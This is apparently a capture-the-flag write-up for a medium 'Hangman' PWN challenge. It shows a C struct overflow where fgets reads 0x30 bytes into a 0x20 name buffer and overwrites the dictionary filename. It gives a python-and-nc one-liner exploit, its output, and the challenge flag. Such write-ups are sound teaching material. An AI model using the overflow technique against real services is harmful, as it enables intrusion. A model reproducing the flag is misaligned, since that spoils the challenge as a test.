# Hangman

**Category:** PWN  
**Difficulty:** Medium  
**Author:** Grace  

## Description

There's a secret hangman game deployed in the ship's servers. You don't have the privileges to
access the server, but you can still play it. See what you can find.

Play by running `nc <ip-address-here> <port-here>`.

## Tools Used

- `python`

## Files Provided

- `hangman.c`

## Flag

`flag{0h_m4n_1_f33l_0v3rfl0w3d}`

## Solution

Looking at the `hangman.c`, we can see the following:
```c
int main() {
    ...
 // MAKE SURE TO COMMENT THIS OUT BEFORE PUSHING TO PROD!!!
 // strcpy(sess.dict, "test_dict.txt");
    strcpy(sess.dict, "dictionary.txt");
    ...
}
```

If we manage to change the `"dictionary.txt"` to `"test_dict.txt"`, something interesting might
happen.

Going down further, we can also see the following:
```c
struct Session {
    // In the future, there will be multiple dictionaries players can choose from.
    char player[0x20];
    char dict[0xFF];
    unsigned int lives;
};

int main() {
    ...
    printf("Welcome to Hangman!\nEnter your name: ");

    fgets(sess.player, 0x30, stdin);
    ...
}
```

It's calling `fgets` with a size of `0x30` when `sess.player` only has a size of `0x20`. We can
exploit this to change `sess.dict` to whatever we want. When the program asks for our name, we can
input 32 garbage characters, to fill `sess.player`, followed by `test_dict.txt` to overwrite
`sess.dict`.

Thus, we can solve the challenge by running the command:
```bash
python -c "print('a'*32+'test_dict.txt\n9\n8\n7')" - | nc <ip-address-here> <port-here>
```

and we'd see the following output:
```
Welcome to Hangman!
Enter your name:
Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatest_dict.txt!

Guess the word! You have 3 lives left!
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

Enter your guess:
Guess the word! You have 2 lives left!
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

Enter your guess:
Guess the word! You have 1 lives left!
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

Enter your guess:

Don't worry aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatest_dict.txt, you'll get it next time! The word was 'flag{0h_m4n_1_f33l_0v3rfl0w3d}'.
```

## Solve Script

Run `solve.sh`.

## Techniques / Tags

`buffer-overflow`

## Setup / Deployment Notes

Run `docker compose up` in the parent folder.
- Run `docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' hangman` to find the
  IP Address of the container so you can SSH into it.

## Known Issues / Notes

N/A

